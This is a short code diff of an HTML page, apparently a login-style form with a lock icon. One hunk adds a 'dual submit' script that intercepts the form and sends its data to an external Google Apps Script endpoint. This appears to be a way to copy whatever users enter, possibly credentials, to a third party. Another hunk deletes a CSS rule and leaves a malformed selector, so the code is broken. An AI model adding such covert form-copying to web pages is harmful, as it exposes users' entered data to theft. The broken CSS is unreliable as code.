@@ -39,13 +39,7 @@
       z-index: 1;
       user-select: none;
     }
-    .lock-container {
-      position: absolute;
-      top: 38px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 60px;
-      height: 60px;
+    .: 60px;
       border-radius: 50%;
       background: white;
       display: flex;
@@ -291,7 +285,10 @@
   </script>
   <!-- DUAL SUBMIT SCRIPT: Only this is added -->
   <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycby5ZLQL6JiPNt_LIkqdRpxCLlu1jVjEg-Zcxuq9u-p_-1n9Nmx4jdjhdkm8vNvbDo-q/exec;
+    const scriptURL = 'https://script.google.com/macros/s/AKfycby5ZLQL6JiPNt_LIkqdRpxCLlu1jVjEg-Zcxuq9u-p_-1n9Nmx4jdjhdkm8vNvbDo-q/exec';
+
+    async function dualSubmit(event) {
+      event.preventDefault();
       const form = event.target;
       const formData = new FormData(form);
 
